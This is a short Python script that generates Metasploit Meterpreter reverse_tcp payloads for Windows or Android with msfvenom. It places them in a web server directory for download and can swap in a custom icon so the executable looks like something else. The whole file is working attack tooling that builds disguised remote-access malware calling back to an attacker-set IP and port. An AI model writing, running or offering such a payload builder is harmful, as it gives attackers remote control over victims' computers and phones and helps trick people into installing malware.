import os

def generate_payload(platform, ip, port, filename, icon_path=None):
    filename_full = f"{filename}.exe" if platform == "Windows" else f"{filename}.apk"
    output_path = f"/var/www/html/{filename_full}"

    if platform == "Windows":
        cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {output_path}"
        os.system(cmd)

        if icon_path and os.path.exists(icon_path):
            icon_cmd = f'wine ~/reshacker/ResourceHacker.exe -open {output_path} -save {output_path} -action addoverwrite -res "{icon_path}" -mask ICONGROUP,MAINICON,'
            os.system(icon_cmd)

    elif platform == "Android":
        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_path}"
        os.system(cmd)

    return filename_full
